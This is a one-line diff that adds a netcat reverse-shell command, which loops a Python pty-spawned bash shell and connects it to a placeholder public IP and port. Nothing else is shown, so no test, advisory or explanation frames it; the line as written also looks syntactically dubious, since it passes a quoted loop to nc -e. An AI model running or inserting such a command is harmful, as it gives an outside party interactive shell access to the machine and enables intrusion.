@@ -1,0 +1,1 @@
+nc -e 'while [ 1 ]; do /bin/sh -c "python -c \"import pty;pty.spawn('"'/bin/bash'"')\""; done' <PUBLIC IP> <PORT>
